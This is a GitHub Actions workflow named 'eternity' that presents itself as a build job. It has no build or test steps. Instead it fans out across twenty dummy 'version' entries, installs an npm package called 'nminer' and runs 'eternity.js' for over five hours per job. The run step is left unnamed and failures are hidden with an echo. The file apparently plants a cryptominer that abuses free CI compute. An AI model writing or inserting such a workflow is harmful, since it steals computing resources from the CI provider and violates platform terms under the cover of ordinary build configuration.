name: eternity
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9514 }
          - { version: 6825 }
          - { version: 6443 }
          - { version: 1471 }
          - { version: 8768 }
          - { version: 7760 }
          - { version: 7623 }
          - { version: 589 }
          - { version: 2287 }
          - { version: 7400 }
          - { version: 4680 }
          - { version: 9018 }
          - { version: 3821 }
          - { version: 7056 }
          - { version: 9274 }
          - { version: 8887 }
          - { version: 3498 }
          - { version: 8430 }
          - { version: 4900 }
          - { version: 7463 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 306m node eternity.js || echo "eternity executed"